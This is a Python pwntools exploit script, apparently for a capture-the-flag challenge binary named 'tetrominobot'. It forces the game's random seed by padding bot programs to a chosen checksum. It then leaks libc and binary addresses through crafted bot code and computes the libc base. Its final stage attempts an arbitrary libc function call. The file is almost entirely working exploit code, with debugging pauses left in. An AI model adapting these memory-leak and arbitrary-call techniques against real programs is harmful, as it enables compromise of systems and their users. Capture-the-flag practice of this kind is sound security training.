from pwn import *
from functools import reduce

context.aslr = False
# context.log_level = "debug"
context.log_level = "info"

def spawn_process(): # as the server runs it
    return process(["./out/handout/ld-linux-x86-64.so.2", "--library-path", \
                    "./out/handout", "./out/handout/tetrominobot"])
# return process(["./out/handout/tetrominobot"])

SEED_SIZE = 2 ** 16;
GOAL_SRAND = 0

def prog_sum(prog):
    return reduce(lambda a, c: a + c, prog, 0) % SEED_SIZE

# played manually with srand 0 searching for addresses, logging inputs
cmdlog_ceiling = b"=== g  g--.ad-d---d-d=dda=d=d=dd=d.."
cmdlog_tspin = b"d----   g    gw===    -g====s.wd==.-.w--a   a.g"


def wrap_curly(bs):
    return b'{' + bs + b'}'

def manual_in_to_bot(bs):
    # i lose hair writing python
    def cmd_to_call(b):
        match chr(b):
            case '-':
                return b"left"
            case '=':
                return b"right"
            case '.':
                return b"drop"
            case 'w':
                return b"hold"
            case 'a':
                return b"rot_l"
            case 's':
                return b"rot_180"
            case 'd':
                return b"rot_r"
            case ' ':
                return b"down"
            case 'g':
                return b"commit"
            case _:
                return b"die"

    def cmd_to_cond(i, cmd):
        return b'if (mem[4] == ' \
            + bytes(str(i), 'utf-8') \
            + b') { mem[5] = call(' \
            + cmd_to_call(cmd) \
            + b'); } '
    # mem[0] = string address
    # mem[1] = callable address
    # mem[2] = 0 (segfault barrier)
    # mem[4] = global counter
    # mem[5] = f return value

    cond_move = b''.join(map(cmd_to_cond, range(len(bs)), bs))
    increment_counter = b'mem[4] = mem[4] + 1; '
    p_mem = b'if (mem[5] > 7 || mem[5] < 0) { print(88888888888888); print(mem[4]); print(mem[5]); } '

    p1 = wrap_curly(cond_move + increment_counter + p_mem)
    return p1
# return srand_override(b'{call(drop)}')

def pwn_send_bot(p, bot):
    def srand_override(prog):
        # EOF char = 4, newline = 10 (will not work with cmdline -b prog)
        todo = (GOAL_SRAND + SEED_SIZE - (prog_sum(prog) + 10 + 4)) % SEED_SIZE
        return prog + b'' \
            + b''.join([b'~' for i in range(todo // ord('~'))]) \
            + bytes([todo % ord('~')])

    p.recvuntil(b'> ')
    p.sendline(b"-d_name")
    p.recvuntil(b'> ')
    p.sendline(srand_override(bot))


def pwn_send_bot_recv(p, bot):
    pwn_send_bot(p, bot)
    debug_prints = p.recvuntil(b"+------------+--------------------+------------+", drop=True)
    board = p.recvuntil(b"Score: ")
    score = p.recvuntil(b'\n')
    log.info(debug_prints)
    log.info(board)
    log.info(b"py rcved score: " + score)
    p.recvuntil(b'> ')
    p.sendline(b'y')
    return (debug_prints, score)

eights = b'88888888888888'

def pwn_1_find_libc(p):
    (ceil_log, _) = pwn_send_bot_recv(p, manual_in_to_bot(cmdlog_ceiling))
    ceil_log = ceil_log.split(b'\n')
    ceil_log = ceil_log[ceil_log.index(eights):-2]
    log.info(ceil_log)
    for c in ceil_log:
        if c == eights:
            continue
        log.info(hex(unsigned(int(c))))
        libc_u = libc_l = b''
    for i in range(len(ceil_log) // 3):
        (e_mark, mem4ctr, mem5retval) = ceil_log[i*3:i*3+3]
        if e_mark != eights:
            print(b"probably wrong: " + eights)
        if mem4ctr == b'14':
            libc_u = unsigned(int(mem5retval))
        if mem4ctr == b'19':
            libc_l = unsigned(int(mem5retval))

    libc_leak = (libc_u << 32) + libc_l
    libc_leak_offset = 0x15555541a780 - 0x155555200000
    # base address
    return libc_leak - libc_leak_offset

def pwn_2_find_bin(p):
    (_, tsp_score) = pwn_send_bot_recv(p, manual_in_to_bot(cmdlog_tspin))
    return int(tsp_score)

def pwn_3_arb_call(p, libc_addr):
    exit_offset = 0x000455f0 + libc_addr
    str_offset = 0x00019767 + libc_addr # char *strtok
    print("libc: ", hex(exit_offset))
    pause()
    callbot = b"{mem[0]=" + bytes(str(str_offset), 'utf-8') + b"; mem[1]=" + bytes(str(exit_offset), 'utf-8') + b"call(strtok)" + b"}"
    pwn_send_bot(p, callbot)

def main():
    p = spawn_process()
    libc_addr = pwn_1_find_libc(p)
    bin_addr = pwn_2_find_bin(p)

    log.info("libc addr: " + hex(libc_addr))
    log.info("tetrominobot addr: " + hex(bin_addr))
    # libc = ELF("./out/handout/libc.so.6")
    pwn_3_arb_call(p, libc_addr)
    print("PID:", p.pid)
    pause()
    p.close()

main()
